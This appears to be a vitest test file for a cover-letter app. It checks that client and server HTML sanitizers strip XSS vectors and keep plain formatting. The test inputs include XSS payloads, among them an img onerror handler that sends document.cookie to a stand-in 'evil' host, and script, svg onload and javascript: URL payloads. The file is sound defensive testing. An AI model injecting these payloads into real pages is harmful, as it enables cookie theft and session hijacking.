import { describe, it, expect } from "vitest";
import { sanitizeLetterHtml } from "../lib/sanitizeHtml";
import { sanitizeLetterHtmlServer, letterHtmlHasText } from "../lib/sanitizeHtmlServer";

// Locks the cover-letter XSS fix: the body is rendered via innerHTML in the
// admin's session (LAW #37 review) + live-broadcast to peers, so the sanitizer
// must strip every script-execution vector while keeping plain formatting.
//
// TWO implementations must satisfy the SAME invariants:
//   • sanitizeLetterHtml       — client (isomorphic-dompurify → browser DOM)
//   • sanitizeLetterHtmlServer — server (sanitize-html, jsdom-free; the server
//     route can't load jsdom on Vercel — see lib/sanitizeHtmlServer.ts).
// Running both through one shared spec guarantees the server sanitizer never
// silently diverges from the DOMPurify guarantee the client render sink relies
// on.
const IMPLS: Array<[string, (h: string) => string]> = [
  ["client (DOMPurify)", sanitizeLetterHtml],
  ["server (sanitize-html)", sanitizeLetterHtmlServer],
];

describe.each(IMPLS)("sanitizeLetterHtml — %s", (_label, sanitize) => {
  it("strips img onerror payloads", () => {
    const out = sanitize(`<img src=x onerror="fetch('//evil/'+document.cookie)">`);
    expect(out).not.toMatch(/onerror/i);
    expect(out).not.toMatch(/<img/i);
  });

  it("strips <script> and its content", () => {
    const out = sanitize(`<script>alert(1)</script>hi`);
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/alert\(1\)/);
    expect(out).toMatch(/hi/);
  });

  it("strips svg/iframe/object", () => {
    const out = sanitize(`<svg onload=alert(1)></svg><iframe src=javascript:alert(1)></iframe><object data=x></object>`);
    expect(out).not.toMatch(/<svg|<iframe|<object|onload|javascript:/i);
  });

  it("strips event handlers from allowed tags", () => {
    const out = sanitize(`<p onclick="alert(1)">text</p>`);
    expect(out).toMatch(/text/);
    expect(out).not.toMatch(/onclick/i);
  });

  it("removes anchors but keeps their text (no javascript: href)", () => {
    const out = sanitize(`<a href="javascript:alert(1)">click</a>`);
    expect(out).not.toMatch(/<a|href|javascript:/i);
    expect(out).toMatch(/click/);
  });

  it("keeps benign formatting tags", () => {
    const out = sanitize(`<b>bold</b> <i>it</i> <u>u</u><ul><li>one</li></ul>`);
    expect(out).toMatch(/<b>bold<\/b>/);
    expect(out).toMatch(/<i>it<\/i>/);
    expect(out).toMatch(/<li>one<\/li>/);
  });

  it("drops class but keeps the paragraph (matches real stored letters)", () => {
    const out = sanitize(`<p class="font-claude-response-body leading-[1.7]">mit großer Motivation</p>`);
    expect(out).not.toMatch(/class=/i);
    expect(out).toMatch(/<p[^>]*>mit großer Motivation<\/p>/);
  });

  it("returns plain text unchanged", () => {
    expect(sanitize("Sehr geehrte Damen und Herren")).toBe("Sehr geehrte Damen und Herren");
  });
});

// letterHtmlHasText decides clear ("" stored) vs content — this is the LAW #37
// fix: a deliberately-emptied letter must be storable as "" (distinct from a
// never-written NULL) so a stale local draft can never resurrect it.
describe("letterHtmlHasText — emptied editor counts as a clear", () => {
  it("is false for structural-only / empty HTML (a clear)", () => {
    for (const h of ["", "<br>", "<p></p>", "<div><br></div>", "&nbsp;", "  ", "<p>&nbsp;</p>", "<p><br></p>"]) {
      expect(letterHtmlHasText(h), JSON.stringify(h)).toBe(false);
    }
  });
  it("is true when there is real text", () => {
    for (const h of ["<p>mit großer Motivation</p>", "hallo", "<b>x</b>", "<p>a</p><p>b</p>"]) {
      expect(letterHtmlHasText(h), JSON.stringify(h)).toBe(true);
    }
  });
});
